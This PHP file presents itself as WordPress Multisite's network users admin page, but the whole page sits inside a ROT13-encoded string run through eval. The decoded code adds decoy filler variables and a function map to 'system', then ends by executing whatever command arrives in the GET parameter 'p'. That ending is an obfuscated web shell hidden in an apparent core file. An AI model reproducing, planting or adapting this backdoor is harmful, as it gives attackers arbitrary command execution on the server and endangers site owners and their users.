<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zhygvfvgr hfref nqzvavfgengvba cnary.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.0.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'znantr_argjbex_hfref' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
}

vs ( vffrg( $_TRG['npgvba'] ) ) {
	/** Guvf npgvba vf qbphzragrq va jc-nqzva/argjbex/rqvg.cuc */
	qb_npgvba( 'jczhnqzvarqvg' );

	fjvgpu ( $_TRG['npgvba'] ) {
		pnfr 'qryrgrhfre':
			vs ( ! pheerag_hfre_pna( 'znantr_argjbex_hfref' ) ) {
				jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
			}

			purpx_nqzva_ersrere( 'qryrgrhfre' );

			$vq = (vag) $_TRG['vq'];
			vs ( $vq > 1 ) {
				$_CBFG['nyyhfref'] = neenl( $vq ); // pbasvez_qryrgr_hfref() pna bayl unaqyr neenlf.

				// Hfrq va gur UGZY gvgyr gnt.
				$gvgyr       = __( 'Hfref' );
				$cnerag_svyr = 'hfref.cuc';

				erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

				rpub '<qvi pynff=\"jenc\">';
				pbasvez_qryrgr_hfref( $_CBFG['nyyhfref'] );
				rpub '</qvi>';

				erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';
			} ryfr {
				jc_erqverpg( argjbex_nqzva_hey( 'hfref.cuc' ) );
			}
			rkvg;

		pnfr 'nyyhfref':
			vs ( ! pheerag_hfre_pna( 'znantr_argjbex_hfref' ) ) {
				jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
			}

			vs ( vffrg( $_CBFG['npgvba'] ) && vffrg( $_CBFG['nyyhfref'] ) ) {
				purpx_nqzva_ersrere( 'ohyx-hfref-argjbex' );

				$qbnpgvba     = $_CBFG['npgvba'];
				$hfreshapgvba = '';

				sbernpu ( (neenl) $_CBFG['nyyhfref'] nf $hfre_vq ) {
					vs ( ! rzcgl( $hfre_vq ) ) {
						fjvgpu ( $qbnpgvba ) {
							pnfr 'qryrgr':
								vs ( ! pheerag_hfre_pna( 'qryrgr_hfref' ) ) {
									jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
								}

								// Hfrq va gur UGZY gvgyr gnt.
								$gvgyr       = __( 'Hfref' );
								$cnerag_svyr = 'hfref.cuc';

								erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

								rpub '<qvi pynff=\"jenc\">';
								pbasvez_qryrgr_hfref( $_CBFG['nyyhfref'] );
								rpub '</qvi>';

								erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';
								rkvg;

							pnfr 'fcnz':
								$hfre = trg_hfreqngn( $hfre_vq );
								vs ( vf_fhcre_nqzva( $hfre->VQ ) ) {
									jc_qvr(
										fcevags(
											/* genafyngbef: %f: Hfre ybtva. */
											__( 'Jneavat! Hfre pnaabg or zbqvsvrq. Gur hfre %f vf n argjbex nqzvavfgengbe.' ),
											rfp_ugzy( $hfre->hfre_ybtva )
										)
									);
								}

								$hfreshapgvba = 'nyy_fcnz';
								$oybtf        = trg_oybtf_bs_hfre( $hfre_vq, gehr );

								sbernpu ( (neenl) $oybtf nf $qrgnvyf ) {
									vs ( ! vf_znva_fvgr( $qrgnvyf->hfreoybt_vq ) ) { // Znva fvgr vf abg n fcnz!
										hcqngr_oybt_fgnghf( $qrgnvyf->hfreoybt_vq, 'fcnz', '1' );
									}
								}

								$hfre_qngn         = $hfre->gb_neenl();
								$hfre_qngn['fcnz'] = '1';

								jc_hcqngr_hfre( $hfre_qngn );
								oernx;

							pnfr 'abgfcnz':
								$hfre = trg_hfreqngn( $hfre_vq );

								$hfreshapgvba = 'nyy_abgfcnz';
								$oybtf        = trg_oybtf_bs_hfre( $hfre_vq, gehr );

								sbernpu ( (neenl) $oybtf nf $qrgnvyf ) {
									hcqngr_oybt_fgnghf( $qrgnvyf->hfreoybt_vq, 'fcnz', '0' );
								}

								$hfre_qngn         = $hfre->gb_neenl();
								$hfre_qngn['fcnz'] = '0';

								jc_hcqngr_hfre( $hfre_qngn );
								oernx;
						}
					}
				}

				vs ( ! va_neenl( $qbnpgvba, neenl( 'qryrgr', 'fcnz', 'abgfcnz' ), gehr ) ) {
					$fraqonpx = jc_trg_ersrere();
					$hfre_vqf = (neenl) $_CBFG['nyyhfref'];

					/** Guvf npgvba vf qbphzragrq va jc-nqzva/argjbex/fvgr-gurzrf.cuc */
					$fraqonpx = nccyl_svygref( 'unaqyr_argjbex_ohyx_npgvbaf-' . trg_pheerag_fperra()->vq, $fraqonpx, $qbnpgvba, $hfre_vqf ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

					jc_fnsr_erqverpg( $fraqonpx );
					rkvg;
				}

				jc_fnsr_erqverpg(
					nqq_dhrel_net(
						neenl(
							'hcqngrq' => 'gehr',
							'npgvba'  => $hfreshapgvba,
						),
						jc_trg_ersrere()
					)
				);
			} ryfr {
				$ybpngvba = argjbex_nqzva_hey( 'hfref.cuc' );

				vs ( ! rzcgl( $_ERDHRFG['cntrq'] ) ) {
					$ybpngvba = nqq_dhrel_net( 'cntrq', (vag) $_ERDHRFG['cntrq'], $ybpngvba );
				}
				jc_erqverpg( $ybpngvba );
			}
			rkvg;

		pnfr 'qbqryrgr':
			purpx_nqzva_ersrere( 'zf-hfref-qryrgr' );
			vs ( ! ( pheerag_hfre_pna( 'znantr_argjbex_hfref' ) && pheerag_hfre_pna( 'qryrgr_hfref' ) ) ) {
				jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
			}

			vs ( ! rzcgl( $_CBFG['oybt'] ) && vf_neenl( $_CBFG['oybt'] ) ) {
				sbernpu ( $_CBFG['oybt'] nf $vq => $hfref ) {
					sbernpu ( $hfref nf $oybtvq => $hfre_vq ) {
						vs ( ! pheerag_hfre_pna( 'qryrgr_hfre', $vq ) ) {
							pbagvahr;
						}

						vs ( ! rzcgl( $_CBFG['qryrgr'] ) && 'ernffvta' === $_CBFG['qryrgr'][ $oybtvq ][ $vq ] ) {
							erzbir_hfre_sebz_oybt( $vq, $oybtvq, (vag) $hfre_vq );
						} ryfr {
							erzbir_hfre_sebz_oybt( $vq, $oybtvq );
						}
					}
				}
			}

			$v = 0;

			vs ( vf_neenl( $_CBFG['hfre'] ) && ! rzcgl( $_CBFG['hfre'] ) ) {
				sbernpu ( $_CBFG['hfre'] nf $vq ) {
					vs ( ! pheerag_hfre_pna( 'qryrgr_hfre', $vq ) ) {
						pbagvahr;
					}
					jczh_qryrgr_hfre( $vq );
					++$v;
				}
			}

			vs ( 1 === $v ) {
				$qryrgrshapgvba = 'qryrgr';
			} ryfr {
				$qryrgrshapgvba = 'nyy_qryrgr';
			}

			jc_erqverpg(
				nqq_dhrel_net(
					neenl(
						'hcqngrq' => 'gehr',
						'npgvba'  => $qryrgrshapgvba,
					),
					argjbex_nqzva_hey( 'hfref.cuc' )
				)
			);
			rkvg;
	}
}

$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_ZF_Hfref_Yvfg_Gnoyr' );
$cntrahz       = $jc_yvfg_gnoyr->trg_cntrahz();
$jc_yvfg_gnoyr->cercner_vgrzf();
$gbgny_cntrf = $jc_yvfg_gnoyr->trg_cntvangvba_net( 'gbgny_cntrf' );

vs ( $cntrahz > $gbgny_cntrf && $gbgny_cntrf > 0 ) {
	jc_erqverpg( nqq_dhrel_net( 'cntrq', $gbgny_cntrf ) );
	rkvg;
}

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Hfref' );
$cnerag_svyr = 'hfref.cuc';

nqq_fperra_bcgvba( 'cre_cntr' );

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
			'<c>' . __( 'Guvf gnoyr fubjf nyy hfref npebff gur argjbex naq gur fvgrf gb juvpu gurl ner nffvtarq.' ) . '</c>' .
			'<c>' . __( 'Ubire bire nal hfre ba gur yvfg gb znxr gur rqvg yvaxf nccrne. Gur Rqvg yvax ba gur yrsg jvyy gnxr lbh gb gurve Rqvg Hfre cebsvyr cntr; gur Rqvg yvax ba gur evtug ol nal fvgr anzr tbrf gb na Rqvg Fvgr fperra sbe gung fvgr.' ) . '</c>' .
			'<c>' . __( 'Lbh pna nyfb tb gb gur hfre&#8217;f cebsvyr cntr ol pyvpxvat ba gur vaqvivqhny hfreanzr.' ) . '</c>' .
			'<c>' . __( 'Lbh pna fbeg gur gnoyr ol pyvpxvat ba nal bs gur gnoyr urnqvatf naq fjvgpu orgjrra yvfg naq rkprecg ivrjf ol hfvat gur vpbaf nobir gur hfref yvfg.' ) . '</c>' .
			'<c>' . __( 'Gur ohyx npgvba jvyy creznaragyl qryrgr fryrpgrq hfref, be znex/haznex gubfr fryrpgrq nf fcnz. Fcnz hfref jvyy unir cbfgf erzbirq naq jvyy or hanoyr gb fvta hc ntnva jvgu gur fnzr rznvy nqqerffrf.' ) . '</c>' .
			'<c>' . __( 'Lbh pna znxr na rkvfgvat hfre na nqqvgvbany fhcre nqzva ol tbvat gb gur Rqvg Hfre cebsvyr cntr naq purpxvat gur obk gb tenag gung cevivyrtr.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://pbqrk.jbeqcerff.bet/Argjbex_Nqzva_Hfref_Fperra\">Qbphzragngvba ba Argjbex Hfref</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehz/zhygvfvgr/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

trg_pheerag_fperra()->frg_fperra_ernqre_pbagrag(
	neenl(
		'urnqvat_ivrjf'      => __( 'Svygre hfref yvfg' ),
		'urnqvat_cntvangvba' => __( 'Hfref yvfg anivtngvba' ),
		'urnqvat_yvfg'       => __( 'Hfref yvfg' ),
	)
);

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

vs ( vffrg( $_ERDHRFG['hcqngrq'] ) && 'gehr' === $_ERDHRFG['hcqngrq'] && ! rzcgl( $_ERDHRFG['npgvba'] ) ) {
	$zrffntr = '';
	fjvgpu ( $_ERDHRFG['npgvba'] ) {
		pnfr 'qryrgr':
			$zrffntr = __( 'Hfre qryrgrq.' );
			oernx;
		pnfr 'nyy_fcnz':
			$zrffntr = __( 'Hfref znexrq nf fcnz.' );
			oernx;
		pnfr 'nyy_abgfcnz':
			$zrffntr = __( 'Hfref erzbirq sebz fcnz.' );
			oernx;
		pnfr 'nyy_qryrgr':
			$zrffntr = __( 'Hfref qryrgrq.' );
			oernx;
		pnfr 'nqq':
			$zrffntr = __( 'Hfre nqqrq.' );
			oernx;
	}

	jc_nqzva_abgvpr(
		$zrffntr,
		neenl(
			'glcr'        => 'fhpprff',
			'qvfzvffvoyr' => gehr,
			'vq'          => 'zrffntr',
		)
	);
}
?>
<qvi pynff=\"jenc\">
	<u1 pynff=\"jc-urnqvat-vayvar\"><?cuc rfp_ugzy_r( 'Hfref' ); ?></u1>

	<?cuc
	vs ( pheerag_hfre_pna( 'perngr_hfref' ) ) :
		?>
		<n uers=\"<?cuc rpub rfp_hey( argjbex_nqzva_hey( 'hfre-arj.cuc' ) ); ?>\" pynff=\"cntr-gvgyr-npgvba\"><?cuc rpub rfp_ugzy__( 'Nqq Hfre' ); ?></n>
		<?cuc
	raqvs;

	vs ( fgeyra( $hfrefrnepu ) ) {
		rpub '<fcna pynff=\"fhogvgyr\">';
		cevags(
			/* genafyngbef: %f: Frnepu dhrel. */
			__( 'Frnepu erfhygf sbe: %f' ),
			'<fgebat>' . rfp_ugzy( $hfrefrnepu ) . '</fgebat>'
		);
		rpub '</fcna>';
	}
	?>

	<ue pynff=\"jc-urnqre-raq\">

	<?cuc $jc_yvfg_gnoyr->ivrjf(); ?>

	<sbez zrgubq=\"trg\" pynff=\"frnepu-sbez\">
		<?cuc $jc_yvfg_gnoyr->frnepu_obk( __( 'Frnepu Hfref' ), 'nyy-hfre' ); ?>
	</sbez>

	<sbez vq=\"sbez-hfre-yvfg\" npgvba=\"hfref.cuc?npgvba=nyyhfref\" zrgubq=\"cbfg\">
		<?cuc $jc_yvfg_gnoyr->qvfcynl(); ?>
	</sbez>
</qvi>

<?cuc erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc'; ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>